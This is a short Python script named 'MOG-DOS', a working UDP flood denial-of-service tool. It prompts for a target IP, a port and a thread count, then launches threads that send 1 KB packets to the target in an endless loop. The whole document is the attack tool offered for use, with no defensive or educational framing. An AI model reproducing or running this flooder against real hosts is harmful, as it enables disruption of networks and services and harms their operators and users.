# Welcome to MOG-DOS

import socket
import threading

def flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b'X' * 1024  # 1kb of data
    while True:
        client.sendto(bytes_to_send, (target_ip, target_port))
        print(f"Sent packet to {target_ip}:{target_port}")

def start_attack(target_ip, target_port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port))
        thread.start()
        print(f"Thread {i + 1} started.")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    num_threads = int(input("Enter the number of threads: "))

    start_attack(target_ip, target_port, num_threads)
